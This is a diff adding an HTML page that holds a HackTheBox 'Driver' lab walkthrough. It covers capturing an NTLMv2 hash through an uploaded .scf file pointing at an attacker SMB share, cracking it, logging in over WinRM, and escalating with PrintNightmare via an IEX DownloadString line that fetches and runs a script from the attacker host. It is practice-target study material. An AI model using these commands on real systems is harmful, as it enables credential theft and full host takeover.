@@ -1,0 +1,211 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+<link rel="icon" type="image/x-icon" href="../images/favicon.ico">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HTB - Driver</title>
+
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 900px;
+            margin: 40px auto;
+            line-height: 1.6;
+            color: #222;
+        }
+
+        h1 { margin-bottom: 10px; }
+        h2 { margin-top: 40px; border-bottom: 1px solid #ddd; padding-bottom: 5px; }
+        h3 { margin-top: 25px; }
+
+        img {
+            margin: 15px 0;
+            max-width: 100%;
+            border: 1px solid #ccc;
+        }
+
+        pre {
+            background: #f4f4f4;
+            padding: 12px;
+            overflow-x: auto;
+            border-left: 4px solid #ccc;
+        }
+
+        code { font-family: Consolas, monospace; }
+
+        a { color: #0366d6; text-decoration: none; }
+        a:hover { text-decoration: underline; }
+
+        .navbar {
+            margin-bottom: 30px;
+            padding: 10px 0;
+            border-bottom: 1px solid #ccc;
+        }
+
+        .nav-item {
+            margin-right: 20px;
+            color: #0366d6;
+            text-decoration: none;
+            font-weight: bold;
+        }
+
+        .nav-item.active {
+            color: black;
+            text-decoration: underline;
+        }
+    </style>
+</head>
+
+<body>
+
+<div class="navbar">
+    <a href="../index.html" class="nav-item">Home</a>
+    <a href="../soc_lab_setup.html" class="nav-item">Lab Setup</a>
+    <a href="../case_1.html" class="nav-item">Case 1</a>
+    <a href="../case_2.html" class="nav-item">Case 2</a>
+        <a href="../case_3.html" class="nav-item">Case 3</a>
+    <a href="../ad_attacks_lab.html" class="nav-item">Active Directory Attacks</a>
+    <a href="../more_tools.html" class="nav-item">More Tools</a>
+    <a href="../htb.html" class="nav-item active">HackTheBox</a>
+<a href="../vulnhub.html" class="nav-item">Vulnhub</a>
+<a href="../offsec_proving_grounds.html" class="nav-item">Offsec Proving Grounds</a>
+</div>
+
+<!-- -->
+<h1>Driver (HTB – Easy)</h1>
+
+<p>
+This machine exposes an IIS web application and SMB/WinRM services. Initial access is obtained by abusing a file
+upload feature to capture an NTLMv2 hash via a crafted .scf file. The captured hash is cracked to obtain valid
+credentials for WinRM. Privilege escalation is performed using the PrintNightmare (CVE‑2021‑1675) exploit to
+create a new local administrator.
+</p>
+
+<h2>Overview</h2>
+<p>
+Target: 10.129.95.238  
+<br>Main vector: NTLM capture via .scf upload  
+<br>Privilege escalation: PrintNightmare (CVE‑2021‑1675)  
+</p>
+
+<h2>Enumeration</h2>
+
+<p>Nmap:</p>
+<pre>
+80/tcp   http (IIS 10.0)
+135/tcp  msrpc
+445/tcp  smb
+5985/tcp winrm
+</pre>
+
+<p>SMB checks:</p>
+<pre>
+$ crackmapexec smb 10.129.95.238
+$ smbclient -L 10.129.95.238 -N
+$ smbmap -H 10.129.95.238 -u 'null'
+</pre>
+
+<p>
+The web application (MFP Firmware Update Center) allows file uploads.  
+A Shell Command File (.scf) can be used to trigger an outbound SMB connection and capture NTLMv2.
+</p>
+
+<h2>NTLM Capture via .scf Upload</h2>
+
+<p>Start SMB listener on attacker:</p>
+<pre>
+$ impacket-smbserver smbFolder $(pwd) -smb2support
+</pre>
+
+<p>Create <code>pentestlab.scf</code>:</p>
+<pre>
+[Shell]
+Command=2
+IconFile=\\KALI_IP\smbFolder\pentestlab.ico
+
+[Taskbar]
+Command=ToggleDesktop
+</pre>
+
+<p>
+Upload the .scf file through the web interface.  
+When the server processes the icon path, it connects back to the attacker SMB share and leaks an NTLMv2 hash
+for user <code>tony</code>.
+</p>
+
+<p>Crack the hash:</p>
+<pre>
+$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
+-> tony : liltony
+</pre>
+
+<h2>Foothold</h2>
+
+<p>Validate credentials:</p>
+<pre>
+$ crackmapexec smb 10.129.95.238 -u 'tony' -p 'liltony'
+$ crackmapexec winrm 10.129.95.238 -u 'tony' -p 'liltony'
+-> [Pwn3d!] (tony is in Remote Management Users)
+</pre>
+
+<p>WinRM shell:</p>
+<pre>
+$ evil-winrm -i 10.129.95.238 -u 'tony' -p 'liltony'
+</pre>
+
+<p>
+User access is obtained and user.txt can be read.
+</p>
+
+<h2>Privilege Escalation (PrintNightmare)</h2>
+
+<p>
+Privilege enumeration (e.g. with winPEAS) reveals a vulnerable print spooler configuration.  
+PrintNightmare (CVE‑2021‑1675) can be used for local privilege escalation.
+</p>
+
+<p>Get the exploit (PowerShell implementation, e.g. Invoke-Nightmare):</p>
+<pre>
+# On attacker
+$ wget https://github.com/calebstewart/CVE-2021-1675 -O CVE-2021-1675.ps1
+$ python3 -m http.server 80
+</pre>
+
+<p>On the victim (from the WinRM session):</p>
+<pre>
+PS> IEX (New-Object Net.WebClient).DownloadString('http://KALI_IP/CVE-2021-1675.ps1')
+PS> Invoke-Nightmare -DriverName "Xerox" -NewUser "john" -NewPassword "SuperSecure"
+</pre>
+
+<p>
+This creates a new local user <code>john</code> with administrative privileges.
+</p>
+
+<p>Connect as the new admin:</p>
+<pre>
+$ evil-winrm -i 10.129.95.238 -u 'john' -p 'SuperSecure'
+-> root.txt
+</pre>
+
+<h2>Conclusion</h2>
+<p>
+The machine combines NTLM relay-style credential capture via a malicious .scf upload with a classic Windows
+local privilege escalation (PrintNightmare). After capturing and cracking Tony’s NTLMv2 hash, WinRM access is
+obtained, and the print spooler vulnerability is abused to create a new local administrator and fully compromise
+the host.
+</p>
+
+
+
+<!-- -->
+
+</body>
+</html>
+
+
+
+
+
+
+
